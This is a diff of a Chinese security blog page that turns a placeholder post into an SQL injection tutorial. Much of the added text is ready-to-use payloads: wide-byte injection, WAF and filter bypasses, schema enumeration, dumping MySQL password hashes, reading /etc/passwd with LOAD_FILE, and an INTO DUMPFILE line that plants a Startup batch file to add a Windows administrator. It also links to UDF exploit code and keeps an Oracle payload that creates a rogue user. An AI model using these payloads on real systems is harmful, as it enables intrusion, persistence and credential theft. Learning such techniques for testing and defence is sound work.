@@ -108,7 +108,7 @@
 
 
 
-  <meta name="keywords" content="web,安全," />
+  <meta name="keywords" content="web,安全,SQL注入," />
 
 
 
@@ -119,19 +119,19 @@
 
 
 
-<meta name="description" content="一、SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。">
-<meta name="keywords" content="web,安全">
+<meta name="description" content="SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。 &amp;emsp;&amp;emsp;如果注入的时候在&amp;#39;">
+<meta name="keywords" content="web,安全,SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hello world">
+<meta property="og:title" content="SQL注入攻击">
 <meta property="og:url" content="http://cloudofzm.cn/2018/04/22/SQLInjectionAttack/index.html">
 <meta property="og:site_name" content="hwhehr">
-<meta property="og:description" content="一、SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。">
+<meta property="og:description" content="SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。 &amp;emsp;&amp;emsp;如果注入的时候在&amp;#39;">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://cloudofzm.cn/2018/04/22/SQLInjectionAttack/1.png">
-<meta property="og:updated_time" content="2018-04-25T15:38:10.355Z">
+<meta property="og:updated_time" content="2018-05-01T09:13:42.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hello world">
-<meta name="twitter:description" content="一、SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。">
+<meta name="twitter:title" content="SQL注入攻击">
+<meta name="twitter:description" content="SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。 &amp;emsp;&amp;emsp;如果注入的时候在&amp;#39;">
 <meta name="twitter:image" content="http://cloudofzm.cn/2018/04/22/SQLInjectionAttack/1.png">
 
 
@@ -168,7 +168,7 @@
 
 
 
-  <title>hello world | hwhehr</title>
+  <title>SQL注入攻击 | hwhehr</title>
   
 
 
@@ -332,7 +332,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hello world</h1>
+          <h1 class="post-title" itemprop="name headline">SQL注入攻击</h1>
         
 
         <div class="post-meta">
@@ -415,12 +415,13 @@
       
 
       
-        <h1 id="一、SQL注入攻击"><a href="#一、SQL注入攻击" class="headerlink" title="一、SQL注入攻击"></a>一、SQL注入攻击</h1><ul>
+        <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><ul>
 <li><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4></li>
 </ul>
 <p>&emsp;&emsp;宽字节注入原理：</p>
 <p>&emsp;&emsp;<strong><code>GBK</code> 占用两字节，<code>ASCII</code>占用一字节。PHP中编码为<code>GBK</code>，函数执行添加的是<code>ASCII编码</code>，MYSQL默认字符集是<code>GBK</code>等宽字节字符集。</strong></p>
-<p>&emsp;&emsp;在客户端输入字符<code>&#39;</code>被PHP转义成<code>\&#39;</code>，<code>\&#39;</code>编码是<code>%5c%27</code>。<br><a id="more"></a><br>&emsp;&emsp;如果注入的时候在<code>&#39;</code>前面加上<code>%df</code>字符变成<code>%df&#39;</code>，经过转义之后变成<code>%df%5c%27</code>，而之前说了MYSQL默认的是<code>GBK</code>等宽字节字符集，<code>GBK</code>编码格式会把本来属于<code>ascii</code>编码的字符‘吃掉’，会将<code>%df%5c</code>编码成<code>運</code>，所以会将<code>%df%5c%27</code>编码成<code>運&#39;</code>。</p>
+<p>&emsp;&emsp;在客户端输入字符<code>&#39;</code>被PHP转义成<code>\&#39;</code>，<code>\&#39;</code>编码是<code>%5c%27</code>。</p>
+<p>&emsp;&emsp;如果注入的时候在<code>&#39;</code>前面加上<code>%df</code>字符变成<code>%df&#39;</code>，经过转义之后变成<code>%df%5c%27</code>，而之前说了MYSQL默认的是<code>GBK</code>等宽字节字符集，<code>GBK</code>编码格式会把本来属于<code>ascii</code>编码的字符‘吃掉’，会将<code>%df%5c</code>编码成<code>運</code>，所以会将<code>%df%5c%27</code>编码成<code>運&#39;</code>。</p>
 <p>&emsp;&emsp;于是就可以继续愉快的注入了。</p>
 <p>&emsp;&emsp;<strong>注：</strong> </p>
 <p>&emsp;&emsp;&emsp;&emsp;1.宽字节注入与HTML页面编码是无关的，在<code>&lt;meta charset=utf8&gt;</code>情况下一样有可能进行宽字节注入。</p>
@@ -552,14 +553,43 @@ dbms_xmlquery.getxml()
 <pre><code>id=1 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &apos;&apos;create user pwned identified by pwn3d &apos;&apos;; commit; end;&apos;) from dual) is not null --
 </code></pre><hr>
 <ul>
-<li>布尔注入</li>
-<li>联合查询注入</li>
-<li>时间延时注入</li>
-<li>报错注入</li>
-<li>多语句注入</li>
+<li><h4 id="绕过过滤器的一些姿势"><a href="#绕过过滤器的一些姿势" class="headerlink" title="绕过过滤器的一些姿势"></a>绕过过滤器的一些姿势</h4></li>
 </ul>
-<hr>
-<h5 id="SQL注入资料"><a href="#SQL注入资料" class="headerlink" title="SQL注入资料"></a>SQL注入资料</h5><table>
+<p>&emsp;&emsp;<strong>1. 使用大小写变种</strong></p>
+<pre><code>UNION SELECT password FROM table WHERE username=&apos;admin&apos;--
+uNiOn SElEct password FrOm table WhErE username=&apos;admin&apos;--
+</code></pre><p>&emsp;&emsp;<strong>2. 使用SQL注释</strong></p>
+<pre><code>&apos;/**/UNION/**/SELECT/**/password/**/FROM/**/table/**/WHERE/**/username/**/LIKE/**/&apos;admin&apos;--
+</code></pre><p>&emsp;&emsp;<strong>3. 使用URL编码</strong></p>
+<pre><code>%2f =&gt; / | %2a =&gt; * | %25 =&gt; %
+&apos;%2f%2a*/UNION%2f%2a*/SELECT%2f%2a*/password%2f%2a*/FROM%2f%2a*/table%2f%2a*/WHERE%2f%2a*/username%2f%2a*/LIKE%2f%2a*/&apos;admin&apos;--
+&apos;%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/table%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/&apos;admin&apos;--
+</code></pre><p>&emsp;&emsp;<strong>4. 使用动态查询执行</strong></p>
+<p>&emsp;&emsp;这种方法主要运用在Oracle、SQL Server等数据库中，具体不清楚怎么使用，先码在这。</p>
+<p>&emsp;&emsp;当SELECT被过滤的时候可以使用 <code>&#39;SEL&#39;||&#39;ECT&#39;</code> <code>CHAR(83) +CHAR(69) +CHAR(76) +CHAR(69) +CHAR(67) +CHAR(84)</code></p>
+<p>&emsp;&emsp;MySQL中可以用 <code>WHERE data = 0x64617461</code> 代替 <code>WHERE data = &#39;data&#39;</code></p>
+<p>&emsp;&emsp;<strong>5. 使用空字节</strong></p>
+<p>&emsp;&emsp;有的网站会有入侵检测系统（IDS）或WAF这些检测机制，而这些组件通常是由原声语言写的（如C++），这些语言的字符串通常是由<code>0x00</code>作为停止符。所以在提交SQL注入语句的时候可以加上<code>%00</code>来“结束”字符串。</p>
+<pre><code>%00&apos; UNION SELECT password FROM table WHERE username=&apos;admin&apos;--
+</code></pre><p>&emsp;&emsp;<strong>6. 嵌套剥离后的表达式</strong></p>
+<p>&emsp;&emsp;有些审查过滤器会先从用户输入中剥离特定的字符串，然后在处理数据，如果没有递归多次剥离的话，可以尝试这种方法：</p>
+<pre><code>SELSELECTECT
+</code></pre><p>&emsp;&emsp;<strong>7. 利用截断</strong></p>
+<p>&emsp;&emsp;审查过滤器通常会对用户提供的数据执行多种操作，有时会将输入的数据截断成最大长度，比如：</p>
+<p>&emsp;&emsp;&emsp;&emsp;（1）将引号双重编码，使用<code>&quot;</code>代替<code>&#39;</code>;</p>
+<p>&emsp;&emsp;&emsp;&emsp;（2）将每一项截断成16个字符；</p>
+<pre><code>SELECT uid FROM user_table WHERE username = &apos;name&apos; AND password = &apos;pw&apos;
+</code></pre><p>&emsp;&emsp;提交 <code>username</code> : <code>aaaaaaaaaaaaaaa&#39;</code> , <code>password</code> : <code>or 1=1--</code></p>
+<p>&emsp;&emsp;username有15个a，最后一个<code>&#39;</code>会双重编码成两位字符，username变成一个包含了17个字符的字符串，接下来将其截断成16个字符，清除附加的单引号。这样可以通过向查询插入一个保留的引号字符来干预其语法。</p>
+<p>&emsp;&emsp;<strong>8. 避开自定义过滤器</strong></p>
+<p>&emsp;&emsp;<strong>9. 使用非标准入口点</strong></p>
+<p>&emsp;&emsp;除了提交一些常规的参数（让你手动输入的参数）以外，还有一些自动提交的参数也会被服务器记录，也有可能会产生注入，比如说：HTTP请求头、或者URL后面的一些自动提交的params参数。</p>
+<pre><code>User-Agent , Referer , lang 等参数
+</code></pre><hr>
+<ul>
+<li><h4 id="SQL注入资料"><a href="#SQL注入资料" class="headerlink" title="SQL注入资料"></a>SQL注入资料</h4></li>
+</ul>
+<table>
 <thead>
 <tr>
 <th>常见参数</th>
@@ -576,7 +606,7 @@ dbms_xmlquery.getxml()
 <td>当前数据库名</td>
 </tr>
 <tr>
-<td>version()</td>
+<td>@@version</td>
 <td>当前使用数据库版本</td>
 </tr>
 <tr>
@@ -610,16 +640,12 @@ dbms_xmlquery.getxml()
 <td>限制输出查询条数</td>
 </tr>
 <tr>
+<td>if(1=1,True,False)</td>
+<td>判断条件真假</td>
+</tr>
+<tr>
 <td>concat(str,str…)</td>
 <td>联合数据，用于联合两条数据</td>
-</tr>
-<tr>
-<td>sleep(num)</td>
-<td>延时</td>
-</tr>
-<tr>
-<td>count(*)</td>
-<td>返回数据条数</td>
 </tr>
 <tr>
 <td>group_concat()</td>
@@ -628,6 +654,14 @@ dbms_xmlquery.getxml()
 <tr>
 <td>concat_ws()</td>
 <td>与concat()类似</td>
+</tr>
+<tr>
+<td>sleep(num)</td>
+<td>延时</td>
+</tr>
+<tr>
+<td>count(*)</td>
+<td>返回数据条数</td>
 </tr>
 <tr>
 <td>hex() / unhex()</td>
@@ -643,7 +677,31 @@ dbms_xmlquery.getxml()
 </tr>
 </tbody>
 </table>
+<pre><code>select schema_name from information_schema.schemata;    ###所有库名
+select table_name from information_schema.tables;       ###所有表名
+select column_name from information_schema.columns;     ###所有列名
+</code></pre><!---->
+<p>&emsp;&emsp;<strong>执行系统命令：</strong></p>
+<pre><code># 从MySQL中读取内容并将其写入本地中（例：用于创建一个定期执行的恶意脚本文件）：
+SELECT &apos;system_commands&apos; INTO dumpfile trojanpath
 
+# 在Windows启动目录中创建一个批处理文件，用于添加一个口令为x的管理员用户x：
+SELECT &apos;net user x x /add%26%26 net localgroup administrators x /add&apos; into dumpfile &apos;c:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Starup\\attack.bat&apos;
+</code></pre><p>&emsp;&emsp;<strong>查询数据库口令：</strong></p>
+<pre><code>SELECT concat(user,&quot;:&quot;,password) FROM mysql.user
+</code></pre><p>&emsp;&emsp;<strong>直接攻击数据库：</strong></p>
+<p>&emsp;&emsp;通过直接连接数据库并创建用户自定义函数来执行代码。</p>
+<p>&emsp;&emsp;基于UNIX：<a href="SQLInjectionAttack/raptor_udf.c">raptor_udf.c</a> | <a href="SQLInjectionAttack/raptor_udf2.c">raptor_udf2.c</a></p>
+<p>&emsp;&emsp;基于Windows： <a href="SQLInjectionAttack/raptor_winudf.zip">raptor_winudf.zip</a> （解压密码：0xdeadbeef）</p>
+<p>&emsp;&emsp;代码来自：<a href="http://www.0xdeadbeef.info" target="_blank" rel="noopener">0xdeadbeef.info</a></p>
+<p>&emsp;&emsp;<strong>读写文件：</strong></p>
+<pre><code># 读取文件
+SELECT LOAD_FILE(&apos;/etc/passwd&apos;);
+SELECT LOAD_FILE(0x2F6574632F706173737764); #读取/etc/passwd
+
+# 写入文件
+SELECT * FROM thetable INTO dumofile &apos;/tmp/hacker&apos;;
+</code></pre>
       
     </div>
     
@@ -663,6 +721,8 @@ dbms_xmlquery.getxml()
             <a href="/tags/web/" rel="tag"># web</a>
           
             <a href="/tags/安全/" rel="tag"># 安全</a>
+          
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
           
         </div>
       
@@ -786,7 +846,7 @@ dbms_xmlquery.getxml()
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -835,7 +895,7 @@ dbms_xmlquery.getxml()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、SQL注入攻击"><span class="nav-number">1.</span> <span class="nav-text">一、SQL注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字节注入"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#盲注"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION语句联合查询"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">UNION语句联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-匹配列"><span class="nav-number">1.0.0.3.1.</span> <span class="nav-text">1. 匹配列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-匹配数据类型"><span class="nav-number">1.0.0.3.2.</span> <span class="nav-text">2.匹配数据类型</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#枚举数据库"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">枚举数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#INSERT查询注入攻击"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">INSERT查询注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#堆叠注入"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL注入资料"><span class="nav-number">1.0.0.6.1.</span> <span class="nav-text">SQL注入资料</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入攻击"><span class="nav-number">1.</span> <span class="nav-text">SQL注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字节注入"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#盲注"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION语句联合查询"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">UNION语句联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-匹配列"><span class="nav-number">1.0.0.3.1.</span> <span class="nav-text">1. 匹配列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-匹配数据类型"><span class="nav-number">1.0.0.3.2.</span> <span class="nav-text">2.匹配数据类型</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#枚举数据库"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">枚举数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#INSERT查询注入攻击"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">INSERT查询注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#堆叠注入"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过过滤器的一些姿势"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">绕过过滤器的一些姿势</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入资料"><span class="nav-number">1.0.0.8.</span> <span class="nav-text">SQL注入资料</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
